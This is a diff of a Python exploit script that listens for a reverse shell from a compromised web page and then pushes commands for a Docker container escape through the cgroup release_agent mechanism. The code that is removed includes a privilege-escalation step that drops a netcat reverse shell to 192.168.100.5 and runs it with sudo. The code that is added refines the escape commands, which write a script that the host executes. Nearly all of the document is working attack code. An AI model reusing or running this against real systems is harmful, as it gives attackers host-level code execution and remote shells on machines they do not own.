@@ -5,31 +5,6 @@ import threading
 # I utilized as base code for this listener the code found on:
 # https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html
 
-def get_root(host, r_port,port):
-	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#root_shell = threading.Thread(target=listen, args=(h, port))
-	#root_shell.start()
-	# Bind the socket to the port
-	server_address = (host, port)
-	print('starting up on {} port {}'.format(*server_address))
-	sock.bind(server_address)
-
-	# Listen for incoming connections
-	sock.listen(1)
-
-	while True:
-		# Wait for a connection
-		print('waiting for a connection')
-		connection, client_address = sock.accept()
-	    
-		try:
-			print('connection from', client_address)
-			connection.send('cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/) | awk \'{ print $3 }\' && echo \'#!/bin/bash\' | cat >> tttrev && echo \'nc 192.168.100.5 6666 -e /bin/bash\' | cat >> tttrev && chmod a+x tttrev && sudo find . -exec ./tttrev \; -quit\n'.encode())
-
-		finally:
-			# Clean up the connection
-			connection.close()
-
 def listen(ip, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((ip, port))
@@ -57,24 +32,25 @@ def listen(ip, port):
 			sys.stdout.write("\033[A" + ans.split("\n")[-1])
 		# Whatever you put inside the $dir/escapingDocker script will be executed on the host
 		# with high privileges
-		escape= ['mkdir /tmp/cgroup_mount\n',
-			 'mount -t cgroup -o rmda cgroup /tmp/cgroup_mount/\n',
+		escape= ['rm -drf /tmp/cgroup_mount/ >/dev/null 2>&1\n',
+			 'mkdir /tmp/cgroup_mount >/dev/null 2>&1\n',
+			 'mount -t cgroup -o rdma cgroup /tmp/cgroup_mount/ >/dev/null 2>&1\n',
 			 'mkdir /tmp/cgroup_mount/test\n',
 			 'echo 1 > /tmp/cgroup_mount/test/notify_on_release\n',
-			 '''dir=$(sed -n 's/.*\perdir=\([^,]*\).*/\\1/p' /etc/mtab)\n''',
+			 r'''dir=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)''' + "\n",
 			 'echo $dir"/escapingDocker" >  /tmp/cgroup_mount/release_agent\n',
-			 '''echo '#!/bin/bash' >> $dir/escapingDocker\n''',
-			 '''echo 'ps aux > $dir/output' >> $dir/escapingDocker\n''',
-			 '''echo 'echo "PoC, injected through the container" > /File_on_Host' >> $dir/escapingDocker\n''',
-			 'chmod a+x $dir/escapingDocker\n',
-			 'sh -c "echo\$$ > /tmp/cgroup_mount/test/cgroup.procs"\n']
+			 '''echo '#!/bin/sh' > /escapingDocker\n''',
+			 '''echo 'ps aux >> '$dir'/output' >> /escapingDocker\n''',
+			 '''echo 'echo "PoC, injected through the container" > /File_on_Host' >> /escapingDocker\n''',
+			 'chmod a+x /escapingDocker\n',
+			 'sh -c "echo \$$ > /tmp/cgroup_mount/test/cgroup.procs"\n']
 
 		for cmd in escape:
 			# Avoid stalling for ever
 			conn.settimeout(1.0)
 			try:
 				ans = conn.recv(4194304).decode()
-				sys.stdout.write(ans)
+				# sys.stdout.write(ans) # We could print the output but it won't show much, other than possible errors that most likely dont affect the result 
 			except socket.timeout:
 				# This will happen once we open the root shell because the input will be empty
 				pass
@@ -83,6 +59,9 @@ def listen(ip, port):
 			conn.send(cmd.encode())
 			time.sleep(0.30)
 			sys.stdout.write("\033[A" + ans.split("\n")[-1])
+		
+		print('[+] Exploit completed, if the container was vulnerable, your exploit was executed')
+		print('[+] Exiting the script...')
 	
 	except KeyboardInterrupt:
 		if conn:
@@ -95,14 +74,12 @@ def listen(ip, port):
 
 
 def listen_shell(victim_info, attacker_info, general_info):
-	print('[DEBBUGER] LISTENNING')
 	r_port = random.randint(1024, 65536)
 	# Making sure the random port is not in use
 	while check_port(attacker_info['ip'], r_port):
 		r_port = random.randint(1024, 65536)
 	get_access = threading.Thread(target=task, args=(victim_info['ip'], victim_info['port']))
 	get_access.start() # Access the page that contains the reverse shell in order to establish connection
-	#get_root(attacker_info['ip'],r_port,int(attacker_info['port']))
 	listen(attacker_info['ip'],int(attacker_info['port']))
 
 
